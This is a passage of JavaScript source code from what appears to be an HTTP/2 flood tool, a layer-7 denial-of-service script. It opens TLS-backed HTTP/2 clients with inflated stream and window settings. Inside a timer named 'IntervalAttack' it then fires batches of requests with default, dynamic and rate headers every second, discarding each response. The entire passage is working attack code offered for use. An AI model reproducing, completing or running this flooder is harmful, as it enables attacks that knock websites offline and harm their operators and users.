                maxDeflateDynamicTableSize: 4294967295,
                createConnection: () => tlsConn,
                socket: connection,
            });

            client.settings({
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            });

            client.on("connect", () => {
                const IntervalAttack = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        // Send request with default headers
                        const request1 = client.request(headers)
                            .on("response", response => {
                                request1.close();
                                request1.destroy();
                                return;
                            });
                        request1.end();

                        // Send request with dynamic headers
                        const request2 = client.request(DynHeaders)
                            .on("response", response => {
                                request2.close();
                                request2.destroy();
                                return;
                            });
                        request2.end();

                        // Send request with rate headers with request method GET,POST
                        const request3 = client.request(RateHeaders)
                            .on("response", response => {
                                request3.close();
                                request3.destroy();
                                return;
                            });
                        request3.end();
                    }
                }, 1000);
            });

            client.on("close", () => {
                client.destroy();
                connection.destroy();
                return;
            });

            client.on("error", error => {
                client.destroy();
                connection.destroy();
                return;
            });
        };
        createClient();
    });
}